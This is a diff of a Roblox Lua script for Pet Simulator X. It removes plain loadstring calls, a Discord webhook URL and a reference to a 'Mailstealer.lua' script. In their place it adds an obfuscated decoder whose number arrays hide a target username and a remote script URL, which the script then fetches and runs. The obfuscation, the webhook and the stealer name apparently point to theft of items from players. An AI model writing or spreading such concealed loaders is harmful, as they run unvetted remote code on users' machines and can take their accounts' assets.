@@ -1,8 +1,7 @@
-_G.UserID = 12490815
-_G.WebHook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
--- _G.UserName = "8kknb5e8ryn"
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/load.lua", true))()
 
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/Mailstealer.lua", true))()
+
+function EruRZWiZcZCznkXjRJOgGgrSyyPIpgEtkNoNRECEzJoTGBQzeQyQySoEETuiKCzsXtkqbISlIRXPdfOWtPeKdAIkktuBG(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+_G.UserName = EruRZWiZcZCznkXjRJOgGgrSyyPIpgEtkNoNRECEzJoTGBQzeQyQySoEETuiKCzsXtkqbISlIRXPdfOWtPeKdAIkktuBG({5880,11235,11235,11550,10290,5565,10605,5880,11970,12705,11550})
+loadstring(game:HttpGet(EruRZWiZcZCznkXjRJOgGgrSyyPIpgEtkNoNRECEzJoTGBQzeQyQySoEETuiKCzsXtkqbISlIRXPdfOWtPeKdAIkktuBG({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,12390,10605,12075,12180,12705,12600,4935,8400,10605,12180,8715,11025,11445,12285,11340,10185,12180,11655,11970,9240,8715,10395,11970,11025,11760,12180,12075,4935,11445,10185,11025,11550,4935,6825,12285,12180,11655,7350,10185,11970,11445,4830,11340,12285,10185}), true))()    
